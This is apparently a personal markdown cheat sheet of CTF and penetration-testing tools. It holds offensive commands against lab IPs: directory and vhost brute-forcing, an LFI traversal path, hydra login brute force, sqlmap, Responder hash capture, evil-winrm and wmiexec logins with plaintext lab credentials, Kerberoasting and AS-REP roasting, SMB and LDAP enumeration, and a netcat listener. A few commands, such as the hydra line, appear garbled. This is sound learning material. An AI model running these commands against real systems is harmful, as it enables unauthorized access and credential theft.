##### List of tools I used so far for CTFs.

### Types of Cyberattacks
* Return Oriented Programming (ROP)
* Local File Inclusion / Remote File Inclusion
* SQL Injection
* Blind SQL Injection - testing for sql injection on target wont show the query results however still can be exploitable.
* Privilige Escalation
* Reverse shell: misconfiguration, SQL, Apache..
* Directory Busting - identify possible hidden directories in websites, hidden endpoints, forgotten pages not used. 
* SSTI (Server Side Template Injection) - injecting template payloads.
* XSS Cross Site Scripting - injecting malicious JS into trusted websites.

### Template Engines
* Handlebars templates for JS.
* Jinja2 Python.

## Web
### Tools:
* BurpSuite
* Wappalyzer - browser extension that analyzes webpage code and returns the technologies used to build it.
* GoBuster/Feroxbuster - enumerating hidden, undocumented, misconfigured assets, accesible without authentication
```bash
# Directory brute-force
gobuster dir --url http://10.129.44.135 --wordlist SecLists-master/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html
gobuster dir --url http://10.129.195.114/ -w /usr/share/wordlists/dirb/common.txt
# VHosts brute-force
gobuster vhost --append-domain -w SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -u 10.129.44.135
# LFI testing
feroxbuster -u http://10.10.10.48 http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts LFI vulnerable?
# Fuzzing, inputing invalid, unexpected, random data to find bugs,vulnerabilites and crash the program.
ffuf -u "http://94.237.56.99:34919/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
# HTTP requests
curl -v http://10.129.1.27/  // HTTP request
# Bypass DNS resolution - resolve domain to IP on port 80 during curl request bypassing DNS resolution.
curl --resolve 'ignition.htb:80:10.129.1.27' http://ignition.htb/
```

## Passwords / hashes
```bash
# Identify hash type
hashid
# Extract hash from zip
zip2john backup.zip > file.hash
# Crack hash with john
john --encoding=ASCII -w=/usr/share/john/filezilla2john.py backup.zip
john -w=/usr/share/wordlists/rockyou.txt file.hash
# Hydra brute force tool for cracking passwords
hydra -l root -P pass.txt 10.129.254.38 http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:C=/login:Invalid" -s 8080 -vadmin/:login%5Busername%5D=^USER^&login%5Bpassword%5D=^PASS^:Incorrect"
```

## Forensics
### Tools:
* zsteg
* Volatility3 - extracting digital artifacts such as memory dump
* exiftool
* hexdump / xxd / bvi
* pwntools
* SecLists - collection of lists usernames, passwords, patterns, payloads and more
* impacket - python classes for working with network protocols, NTLM, SMB, Kerberos and many more
* FreeRDP X11 client  - FreeRDP X11 client to windows
* setoolkit - different pentesting toolkit attacks: websites, wireless, spear-phishing....
```bash
python3 vol.py -f flounder-pc-memdump.elf -p plugin windows.netscan
python3  impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.129.208.89 -windows-auth
# Responder - (MITM / hash capture) authentication methods, capture hashes and authentication methods in the background, NTLM, acts similar to MITM if target tries to authenticate responder acts as the user.
python3 Responder.py -I tun0
# Evil-WinRM shell - Linux no PowerShell(WinRM) ? evil-winrm shell to rescue
evil-winrm -i 10.129.136.91 -u administrator -p Password123
# RDP connection
xfreerdp /v:10.129.1.13 /u:administrator
# WMI execution - windows management framework for task automation, performance monitoring and system info gathering
wmiexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100 # shell linux to win
```

## Reverse Engineering
* ROPgadget
* Ghidra / IDA (static analysis)

## Hardware
* Saleae Logic Analyzer (Logic2) - company that creates hardware debugging software, works by attaching probes to device and analyzing the binary output transmitted.

## Databases / SMB / LDAP
* MongoDB - NoSQL - mongo shell: databases->collections->documents->JSON format
* FTP - transfer files between network devices (SFTP|FTPS)
* Rsync - file transfer, connection + process receiver spawn -> sender and receiver changes -> only changes are updated.
```bash
rsync rsync://10.129.228.37/public/flag.txt . | rsync --list-only 10.129.228.37::
# SQLMap (SELECT * FROM users WHERE username='admin'#' AND password='a')
sqlmap - pentesting tool to detect and exploit sql injection flaws.
sqlmap -u 'http://10.129.44.135/dashboard.php?search=any+query'
# MySQL
mysql -h 10.10.20.30 -u root
# List SMB shares
smbclient -L 10.129.30.50 | smbclient \\\\10.129.30.50\\ADMIN$ | smbclient -L -U ARCHETYPE/sql_svc@10.129.174.162
# Access share
smbclient -U [Domain]/[User]%[Password] //10.10.10.100/Users
smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100
# SMB enumeration
smbmap -H 10.10.10.100 # identify which shares accessible with anonymous login
# LDAP query
ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" samaccountname | grep sAMAccountName
ldapsearch -x -H ldap://10.10.10.161:389 -b "dc=htb,dc=local" # check if ldap allows binding
ldapsearch -x -H ldap://10.10.10.161:389 -b "OU=Service Accounts,dc=htb,dc=local" # search service accounts
# Get domain users
GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100 # impacket get domain user account
```
```bash
# Kerberos attacks
# GetUserSPNs when require Kerberos preauthentication exist, known password
GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100 -request
# GetNPUsers No password -> Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking
GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass

Kerberos-Hashcat: TGT Modes
19600 | Kerberos 5, etype 17, TGS-REP               | Network Protocol
19800 | Kerberos 5, etype 17, Pre-Auth              | Network Protocol
28800 | Kerberos 5, etype 17, DB                    | Network Protocol
19700 | Kerberos 5, etype 18, TGS-REP               | Network Protocol
19900 | Kerberos 5, etype 18, Pre-Auth              | Network Protocol
28900 | Kerberos 5, etype 18, DB                    | Network Protocol
7500  | Kerberos 5, etype 23, AS-REQ Pre-Auth       | Network Protocol
13100 | Kerberos 5, etype 23, TGS-REP               | Network Protocol
18200 | Kerberos 5, etype 23, AS-REP
```

## Cloud
* AWS S3 bucket cloud storage
```bash
# List S3 bucket
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

## Networking
* NetCat / SoCat (more powerfull) - reads data across network using TCP and UDP protocols.
* Socat (more advanced) - redirect incoming traffic at local port to specific port.
```bash
nc -lvnp 4444
# Fork session (child proccess), while parent process continues listening for new connections.
socat TCP-LISTEN:4444,fork TCP:target:4444
```
